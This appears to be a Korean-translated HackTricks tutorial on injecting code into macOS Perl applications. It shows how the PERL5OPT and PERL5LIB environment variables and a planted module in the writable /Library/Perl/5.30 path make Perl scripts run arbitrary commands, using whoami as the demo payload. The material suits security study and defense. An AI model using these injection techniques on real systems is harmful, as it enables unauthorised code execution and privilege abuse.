# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PERL5OPT` 및 `PERL5LIB` 환경 변수를 통한 방법

환경 변수 PERL5OPT를 사용하면 perl이 임의의 명령을 실행하도록 할 수 있습니다.\
예를 들어, 이 스크립트를 생성합니다:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
이제 **환경 변수를 내보내고** **perl** 스크립트를 실행합니다:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
또 다른 옵션은 Perl 모듈을 만드는 것입니다 (예: `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
그리고 env 변수를 사용하세요:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Via dependencies

Perl 실행의 의존성 폴더 순서를 나열할 수 있습니다:
```bash
perl -e 'print join("\n", @INC)'
```
다음과 같은 결과를 반환합니다:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
반환된 폴더 중 일부는 존재하지 않지만, **`/Library/Perl/5.30`**는 **존재**하며, **SIP**에 의해 **보호되지** 않고 **SIP**에 의해 **보호되는** 폴더보다 **앞에** 있습니다. 따라서 누군가 그 폴더를 악용하여 스크립트 종속성을 추가할 수 있으며, 그러면 높은 권한의 Perl 스크립트가 이를 로드할 것입니다.

> [!WARNING]
> 그러나, 그 폴더에 쓰기 위해서는 **root 권한이 필요**하며, 요즘에는 이 **TCC 프롬프트**가 표시됩니다:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

예를 들어, 스크립트가 **`use File::Basename;`**를 가져오고 있다면, `/Library/Perl/5.30/File/Basename.pm`을 생성하여 임의의 코드를 실행할 수 있습니다.

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
